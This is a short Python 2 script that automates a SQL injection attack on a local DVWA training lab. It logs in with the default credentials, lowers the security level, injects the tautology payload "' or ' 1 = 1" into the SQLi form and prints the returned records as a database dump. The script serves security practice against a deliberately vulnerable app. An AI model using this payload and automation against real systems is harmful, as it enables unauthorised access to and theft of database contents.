import mechanize
from bs4 import BeautifulSoup

hotSQLi = "' or ' 1 = 1"

browser = mechanize.Browser()
browser.open("http://localhost/dvwa")

print "#" *55
print "#" + browser.title()
print "#" *55 + "\n"

for form in browser.forms():
	print form

browser.select_form(nr=0)

browser.form['username'] = 'admin'
browser.form['password'] = 'password'
browser.submit()


print "+" *100
print "#" + "Changing Security Option to low"
print "+" *100

browser.open('http://localhost/dvwa/security.php')


browser.select_form(nr=0)
browser.form.find_control("security").readonly=False
browser.form.set_all_readonly(False)

for form in browser.forms():
	print form


secLvl = browser.form.find_control(kind="list",name="security").value=["low"]
browser.submit()

for form in browser.forms():
        print form


browser.open("http://localhost/dvwa/vulnerabilities/sqli")


print "\n"
print "#" *55
print "#" + "The SQL Injection that will be used is: " + hotSQLi
print "#" + "Injecting now"
print "#" *55

for form in browser.forms():
	print form

browser.select_form(nr=0)
browser.form['id'] = hotSQLi
#browser.set_value("1=0;#", name="id", nr=0)
html = browser.submit()

#html = browser.response().read()

print "\n"
print "#" *55
print "#" + "Feeding page into BeautifulSoup LXML Parser"
print "#" *55

dvwaSoup = BeautifulSoup(html,'lxml')


allPRE = dvwaSoup.find_all('pre')


print "\n"
print "#" *55
print "#" + "Dump of database"
print "#" *55

for pre in allPRE:
	print pre
